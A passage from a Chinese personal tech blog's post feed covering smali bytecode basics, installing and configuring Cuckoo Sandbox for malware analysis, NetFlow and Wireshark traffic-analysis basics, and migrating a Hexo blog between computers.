<h3 id="其它基本指令"><a href="#其它基本指令" class="headerlink" title="其它基本指令"></a>其它基本指令</h3><p>smali字节码类似于汇编<br>.method　　方法<br>.end method　　函数结束<br>.parameter　　方法参数<br>.prologue　　方法开始<br>.line 12　　此方法位于第12行<br>.field private isFlag:z　　定义变量<br>move v0, v3 把v3寄存器的值移动到寄存器v0上<br>const-string v0, “MainActivity” 把字符串”MainActivity”赋值给v0寄存器<br>const/high16  v0, 0x7fo3　　把0x7fo3赋值给v0<br>invoke-super　　调用父函数<br>return-void　　函数返回void<br>new-instance　　创建实例<br>iput-object　　对象赋值<br>iget-object　　调用对象<br>invoke-static　　调用静态函数<br>invoke-direct　　调用函数</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">@Override</span><br><span class="line">public void onClick(View view) &#123;</span><br><span class="line">    String str &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">    print(str);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># virtual methods</span><br><span class="line"># 参数类型为Landroid&#x2F;view&#x2F;View，返回类型为V</span><br><span class="line">.method public onClick(Landroid&#x2F;view&#x2F;View;)V</span><br><span class="line">    # 表示有三个寄存器</span><br><span class="line">    .registers 3</span><br><span class="line">    # 参数View类型的view变量对应的是寄存器p1</span><br><span class="line">    .param p1, &quot;view&quot;    # Landroid&#x2F;view&#x2F;View;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 24</span><br><span class="line">    #将&quot;Hello World!&quot;字符串放到寄存器v0中</span><br><span class="line">    const-string v0, &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">    .line 25</span><br><span class="line">    # 定义一个Ljava&#x2F;lang&#x2F;String类型的str变量对应本地寄存器v0</span><br><span class="line">    .local v0, &quot;str&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    # 调用该类的print方法，该方法的参数类型为Ljava&#x2F;lang&#x2F;String，返回值为V</span><br><span class="line">    # 调用print方法传入的参数为&#123;p0, v0&#125;，及print(p0, v0)，p0为this，v0为&quot;Hello World!&quot;字符串</span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;annotationtest&#x2F;MainActivity;-&gt;print(Ljava&#x2F;lang&#x2F;String;)V</span><br><span class="line"></span><br><span class="line">    .line 26</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>


<p>参考文章：<br><a href="https://blog.csdn.net/hp910315/article/details/51823236">静态分析Android程序——smali文件解析</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>Cuckoo-Sandbox学习-安装篇</title>
    <url>/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/</url>
    <content><![CDATA[<p>Cuckoo Sandbox是一个开源的恶意文件自动化分析系统，通过Cuckoo Sandbox可以方便地帮助安全研究人员验证恶意程序的特征信息。</p>
<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>本人在vmware中建立两个虚拟机，一个host，一个guest。<br>VMware 12 Pro<br>ubuntu-16.04.1-desktop-amd64<br>window7-64bit</p>
<a id="more"></a>

<h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p>使用vmware安装ubuntu-16.04.1-desktop-amd64，添加2个网卡，一个NAT模式，一个内网网卡。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/%E7%BD%91%E5%8D%A1-ubuntu.PNG"></p>
<p>依赖库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install python python-pip python-dev libffi-dev libssl-dev</span><br><span class="line">$ sudo apt-get install python-virtualenv python-setuptools</span><br><span class="line">$ sudo apt-get install libjpeg-dev zlib1g-dev swig</span><br></pre></td></tr></table></figure>
<p>为了使用基于Django的Web界面,使用PostgreSQL作为数据库，需要安装MongoDB和PostgreSQL。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install mongodb</span><br><span class="line">$ sudo apt-get install postgresql libpq-dev</span><br></pre></td></tr></table></figure>
<p>建议首先升级pip和setuptools库，因为它们经常过时，导致试图安装Cuckoo时出现问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U pip setuptools</span><br></pre></td></tr></table></figure>
<hr>
<p>若使用virtual box则创建一个cuckoo用户，将其添加到vboxusers组里<font color="red">（VirtualBox安装后创建）</font>。确保运行Cuckoo的用户与用于创建和运行虚拟机的用户相同（至少在VirtualBox的情况下），否则Cuckoo将无法识别和启动这些虚拟机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo adduser cuckoo</span><br><span class="line">$ sudo usermod -a -G vboxusers cuckoo</span><br></pre></td></tr></table></figure>
<p>安装VirtualBox</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install virtualbox</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h2><p>使用一条命令安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pip install -U cuckoo</span><br></pre></td></tr></table></figure>
<p>部分依赖需要翻墙，安装成功如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/install.PNG"></p>
<p>如果在本地使用virtual box则切换cuckoo用户并运行，<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/run.PNG"></p>
<p>从中可以看出配置文件路径为*/home/cuckoo/.cuckoo/conf*，工作目录路径可以修改，.cuckoo为隐藏目录，使用<code>ctrl+h</code>查看隐藏文件。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>几个主要的配置文件：</p>
<ul>
<li>cuckoo.conf：用于配置常规行为和分析选项。</li>
<li>auxiliary.conf：用于启用和配置辅助模块。</li>
<li>&lt;machinery&gt;.conf：用于定义虚拟化软件的选项（该文件与您在cuckoo.conf中选择的机器模块名称相同,virtualbox.conf和vmware.conf）。</li>
<li>memory.conf：波动配置。</li>
<li>processing.conf：用于启用和配置处理模块。</li>
<li>reporting.conf：用于启用或禁用报告格式。</li>
</ul>
<h2 id="客户机安装及配置"><a href="#客户机安装及配置" class="headerlink" title="客户机安装及配置"></a>客户机安装及配置</h2><p>使用vmware安装windows7 64bit，配置一个内网网卡。<br>查看ubuntu16.04.1的ip地址，配置window7客户机的ipv4地址的默认网关和DNS地址为ubuntu的ip地址，如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ip-windows7.PNG"></p>
<p>安装python2.7.10，并关闭windows防火墙和自动更新，原因为他们可能影响恶意软件的行为。<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/win7%E9%85%8D%E7%BD%AE.PNG"></p>
<p>为了正常运行，需要配置如下一些选项。</p>
<ul>
<li>启用自动登录</li>
<li>启用远程RPC</li>
<li>关闭分页（可选）</li>
<li>禁用屏幕保护程序（可选）</li>
</ul>
<p>在Windows 7中，以管理员权限打开管理命令提示符，输入以下命令以启用自动登录和远程RPC。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultUserName /d &lt;USERNAME&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v DefaultPassword /d &lt;PASSWORD&gt; /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\software\Microsoft\Windows NT\CurrentVersion\WinLogon&quot; /v AutoAdminLogon /d <span class="number">1</span> /t REG_SZ /f</span><br><span class="line">reg add &quot;hklm\system\CurrentControlSet\Control\TerminalServer&quot; /v AllowRemoteRPC /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /d <span class="number">0</span>x01 /t REG_DWORD /f</span><br></pre></td></tr></table></figure>
<p>前两条命令里的 &lt;USERNAME&gt; 和 &lt;PASSWORD&gt; 为自己的账户和密码。</p>
<p>找到之前安装的cuckoo路径下的agent/agent.py,并将其放到win7的启动目录下，<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>，把agent.py后缀改为agent.pyw，这样程序启动就不会有GUI窗口。</p>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>很多恶意软件都需要访问网络才可以正常运行，因此需要配置windows主机上网，使用host主机开启流量转发、用 iptables 做地址转换（NAT）规则。</p>
<p>临时开启ip转发功能方式，系统重启之后便失效：</p>
<ul>
<li>sudo sysctl -w net.ipv4.ip_forward=1</li>
<li>sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li>
</ul>
<p>若要重启后仍然有效，则需修改配置文件/etc/sysctl.conf，去掉net.ipv4.ip_forward=1 前的注释，之后执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
<p>然后配置Iptables的规则:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0&#x2F;24 -m conntrack --ctstate NEW -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">sudo iptables -A POSTROUTING -t nat -j MASQUERADE</span><br><span class="line"></span><br><span class="line">sudo vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">编辑 Ubuntu 的网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces ，在文件末尾添加以下两行：</span><br><span class="line">pre-up iptables-restore &lt; &#x2F;etc&#x2F;iptables.rules #开机时启用 iptables 规则</span><br><span class="line">post-down iptables-save &gt; &#x2F;etc&#x2F;iptables.rules #关机前保存当前所有的 iptables 规则</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="/2018/06/06/Cuckoo-Sandbox%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E7%AF%87/ping.PNG"></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Cickoo Sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试-公司内网</title>
    <url>/2018/06/28/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%85%AC%E5%8F%B8%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9a8c7526bd98ce7e74e5fce165f28c31b1bb7195a055d1103eef27b20d0ef187"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析入门</title>
    <url>/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><p>NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。</p>
<a id="more"></a>
<h3 id="NetFlow输出格式"><a href="#NetFlow输出格式" class="headerlink" title="NetFlow输出格式"></a>NetFlow输出格式</h3><p>NetFlow输出格式为报头+一系列Flow流。报头包含序列号、记录数、系统时间等，Flow流包含IP地址、端口、路由信息等。</p>
<p>一个IP数据包的Flow流至少定义了7个关键元素：</p>
<ul>
<li>源IP地址；</li>
<li>目的IP地址；</li>
<li>源端口号；</li>
<li>目的端口号；</li>
<li>第三层协议类型；</li>
<li>TOS字段；</li>
<li>网络设备输入/输出的逻辑端口。</li>
</ul>
<p>OSSIM提供可视化NetFlow图形界面，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/NetFlow.png"></p>
<h3 id="NetFlow监测恶意代码"><a href="#NetFlow监测恶意代码" class="headerlink" title="NetFlow监测恶意代码"></a>NetFlow监测恶意代码</h3><p>NetFlow数据流获取方便，当网络正常运行时，NetFlow数据流是有一定的规律性的，当网络中存在异常流量时，网络流量会发生异常的波动。<br>监测蠕虫的策略：选取几个不同时间段，若时间段内符合特征的Flow超过上限值，则为病毒。</p>
<h3 id="反应网络运行的核心参数"><a href="#反应网络运行的核心参数" class="headerlink" title="反应网络运行的核心参数"></a>反应网络运行的核心参数</h3><ul>
<li>平均每秒流量：如果网络内部存在大流量的攻击或P2P等大流量的下载等异常流量时，其数值会比正常时大很多。</li>
<li>平均每秒包数：大部分的异常流量都会产生非常多的数据包数。</li>
<li>数据包大小分布：64字节左右的小包和1500字节左右的大包的分布比例较小，小包过多，可能存在扫描、攻击行为，大包过多可能存在消耗带宽资源的大包DOS攻击行为。</li>
<li>平均包长：网络内的平均包长会在500-700字节左右。</li>
<li>TCP会话数、UDP会话数、IP地址个数、MAC地址个数。。。</li>
</ul>
<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p> WireShark是目前世界上最流行的网络分析工具，如下图：<br><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/WireShark.png"></p>
<h3 id="界面详解"><a href="#界面详解" class="headerlink" title="界面详解"></a>界面详解</h3><p>1.过滤器规则：</p>
<ul>
<li>tcp-&gt;只显示TCP协议的记录；</li>
<li>http-&gt;只看HTTP协议的记录；</li>
<li>ip.src ==192.168.1.102 -&gt;显示源地址为192.168.1.102的记录；</li>
<li>ip.dst==192.168.1.102 -&gt;目标地址为192.168.1.10的记录；</li>
<li>ip.addr == 42.121.252.58 -&gt;只显示与某主机的通信；</li>
<li>tcp.port ==80-&gt;端口为80的；</li>
<li>tcp.srcport == 80 -&gt;只显示TCP协议的源端口为80的；</li>
<li>http.request.method==”GET”  -&gt;只显示HTTP GET方法的；</li>
<li>eth.type == 0x806-&gt;只显示ARP报文，这个字段的值表示是ARP报文，如果是ip报文此值为0x8000（可在表达式中选取对应的16进制值）。</li>
</ul>
<p>2.封包列表：<br>封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。</p>
<p>3.封包的详细信息：<br>在封包信息中，每行对应的含义及在OSI模型中的对应关系如下：</p>
<ul>
<li>Frame:   物理层的数据帧概况  -&gt;对应OSI七层模型中的【物理层】</li>
<li>Ethernet II: 数据链路层以太网帧头部信息  -&gt;对应OSI七层模型中的【数据链路层】</li>
<li>Internet Protocol Version 4: 互联网层IP包头部信息  -&gt;对应OSI七层模型中的【网络层】</li>
<li>Transmission Control Protocol:  传输层T的数据段头部信息，此处是TCP  -&gt;对应OSI七层模型中的【传输层】</li>
<li>Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议  -&gt;对应OSI七层模型中的【应用层】</li>
</ul>
<h3 id="WireShark统计模块"><a href="#WireShark统计模块" class="headerlink" title="WireShark统计模块"></a>WireShark统计模块</h3><h4 id="捕获文件的属性"><a href="#捕获文件的属性" class="headerlink" title="捕获文件的属性"></a>捕获文件的属性</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7.PNG"><br>这一菜单简单收集所有抓包数据，在定义了过滤条件的时候，将呈现过滤后的数据。当想要知道每秒的平均报文数或是字节数时，可以使用此工具。</p>
<h4 id="Endpoint"><a href="#Endpoint" class="headerlink" title="Endpoint"></a>Endpoint</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/%E7%BB%9F%E8%AE%A1_Endpoints.png"><br>此窗口中，能够看到第2,3,4层的endpoints，也就是以太网，IP, TCP或UDP。查看收发大量数据流的IP地址。</p>
<h4 id="Conversations"><a href="#Conversations" class="headerlink" title="Conversations"></a>Conversations</h4><p><img src="/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/Conversations.PNG"><br>显示2层以太网统计数据，第3层IP统计数据，或第4层TCP或UDP统计数据，网络会话是两个指定终端之间的数据流。例如，IP会话是两个IP地址之间的所有数据流，TCP会话包含了所有TCP连接。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/Chilam007/p/6973990.html"> 抓包工具 - Wireshark（详细介绍与TCP三次握手数据分析）
</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>NetFlow</tag>
        <tag>WireShark</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客迁移到其他电脑</title>
    <url>/2018/08/03/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h2 id="备份原文件"><a href="#备份原文件" class="headerlink" title="备份原文件"></a>备份原文件</h2><p>需要转移的文件有：</p>
<table>
<thead>
<tr>
<th>文件(夹)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>scaffolds/</td>
<td>博客文章模板</td>
</tr>
<tr>
<td>source/</td>
<td>所有的博客文章</td>
</tr>
<tr>
<td>themes/</td>
<td>网站主题</td>
</tr>
<tr>
<td>.gitignore</td>
<td>push时需忽略的文件</td>
</tr>
<tr>
<td>_config.yml</td>
<td>站点配置文件</td>
</tr>
<tr>
<td>package.json</td>
<td>依赖包的名称和版本号</td>
</tr>
</tbody></table>
<p>由于配置文件和主题文件需要经常更改，采用github创建博客分支的方式进行备份。</p>
<a id="more"></a>

<h2 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h2><p>克隆github上上生成的静态文件到hexo文件夹中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yourname/xxxx.github.io.git hexo</span><br></pre></td></tr></table></figure>
<p>克隆后将除.git文件外其他所有文件删除。主要是为了得到版本管理文件夹.git。<br>**.git文件为隐藏文件，可直接将可见文件全部删除**</p>
<p>将备份的原文件复制到此文件夹。若文件夹是从github克隆，则需要删除主题文件中的版本控制文件夹,以next主题为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ rm -rf thems/next/.git*</span><br></pre></td></tr></table></figure>

<p>创建名为hexo的分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -b hexo</span><br></pre></td></tr></table></figure>
<p>保存所有文件到暂存区</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add --all</span><br></pre></td></tr></table></figure>
<p>提交变更</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git commit -m <span class="string">&quot;hexo-2&quot;</span></span><br></pre></td></tr></table></figure>
<p>提交变更时报错：<br><img src="/2018/08/03/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%B5%E8%84%91/git_config.png"><br>根据提示配置。</p>
<p>推送分支到github,并用–set-upstream与origin创建关联，将hexo设置为默认分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git push --set-upstream origin hexo</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="迁移工作："><a href="#迁移工作：" class="headerlink" title="迁移工作："></a>迁移工作：</h1><h2 id="安装hexo博客必要的软件"><a href="#安装hexo博客必要的软件" class="headerlink" title="安装hexo博客必要的软件"></a>安装hexo博客必要的软件</h2><p>下载安装Git客户端</p>
<p>安装node js</p>
<p>安装hexo，并进行hexo init初始化设置。hexo init后文件可以全部删除。</p>
<h2 id="git下载备份的博客文件"><a href="#git下载备份的博客文件" class="headerlink" title="git下载备份的博客文件"></a>git下载备份的博客文件</h2><p>克隆github上上生成的静态文件到文件夹中（主分支中的文件）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yourname/xxxx.github.io.git</span><br></pre></td></tr></table></figure>

<p>克隆后将除.git文件外其他所有文件删除。主要是为了得到版本管理文件夹.git。<br>**.git文件为隐藏文件，可直接将可见文件全部删除**</p>
<p>直接将分支克隆下来，替换除了.git的所有文件，即将所有可见文件复制到已删除所有可见文件的文件夹。再使用npm install安装依赖。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone -b hexo https:&#x2F;&#x2F;github.com&#x2F;yourname&#x2F;xxx.github.io.git</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Github添加新电脑生成的密钥"><a href="#Github添加新电脑生成的密钥" class="headerlink" title="Github添加新电脑生成的密钥"></a>Github添加新电脑生成的密钥</h2><p>打开git bash输入如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxxxx@163.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>邮箱为GitHub注册邮箱，输入命令后直接回车，生成密钥对。根据提示找到密钥对所在位置，将id_rsa.pub公钥内容复制粘贴到Github-settings-‘SSH and GPG keys’-‘SSH keys’中。<br>使用<code>ssh -T git@github.com</code>测试公钥是否添加成功<br><img src="/2018/08/03/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%B5%E8%84%91/%E5%85%AC%E9%92%A5%E6%B5%8B%E8%AF%95.png"></p>
<h2 id="设置个人信息"><a href="#设置个人信息" class="headerlink" title="设置个人信息"></a>设置个人信息</h2><p>使用<code>git config -l</code>来查看是否设置了个人信息，若未设置，则进行如下设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;yourname”</span><br><span class="line">$ git config --global user.email youremail@example.com</span><br></pre></td></tr></table></figure>

<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><p>新建文章</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo n &quot;xxx&quot;</span><br></pre></td></tr></table></figure>
<p>注意：需要使用git push把源文件推到分支上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;xxxx&quot;</span><br><span class="line">$ git push origin hexo</span><br></pre></td></tr></table></figure>
<p>部署文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo d -g</span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="常见报错解决："><a href="#常见报错解决：" class="headerlink" title="常见报错解决："></a>常见报错解决：</h2><ul>
<li>部署时，若报如下错</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">error: 源引用表达式 hexo 没有匹配</span><br><span class="line">error: 推送一些引用到 <span class="string">&#x27;https://github.com/yourname/yourname.github.io.git&#x27;</span> 失败</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b hexo</span><br></pre></td></tr></table></figure>

<p>来切换分支，此时还是会报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: 推送一些引用到 &#39;https:&#x2F;&#x2F;github.com&#x2F;yourname&#x2F;yourname.github.io.git&#39; 失败</span><br><span class="line"></span><br><span class="line">提示：更新被拒绝，因为您当前分支的最新提交落后于其对应的远程分支。</span><br><span class="line"></span><br><span class="line">提示：再次推送前，先与远程变更合并（如 &#39;git pull ...&#39;）。详见</span><br><span class="line"></span><br><span class="line">提示：&#39;git push --help&#39; 中的 &#39;Note about fast-forwards&#39; 小节</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push -u origin +hexo</span><br></pre></td></tr></table></figure>



<ul>
<li>若报如下错</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FATAL Something&#39;s wrong. Maybe you can find the solution here: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;troubleshooting.html</span><br><span class="line">TypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Object</span><br><span class="line">    at copyFile (fs.js:1924:10)</span><br><span class="line">    at tryCatcher (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;util.js:16:23)</span><br><span class="line">    at ret (eval at makeNodePromisifiedEval (&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promisify.js:184:12), &lt;anonymous&gt;:13:39)</span><br><span class="line">    at &#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;hexo-fs&#x2F;lib&#x2F;fs.js:181:12</span><br><span class="line">    at tryCatcher (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;util.js:16:23)</span><br><span class="line">    at Promise._settlePromiseFromHandler (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:512:31)</span><br><span class="line">    at Promise._settlePromise (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:569:18)</span><br><span class="line">    at Promise._settlePromise0 (&#x2F;Users&#x2F;yourname&#x2F;hexo&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:614:10)</span><br><span class="line">    at Promise._settlePromises 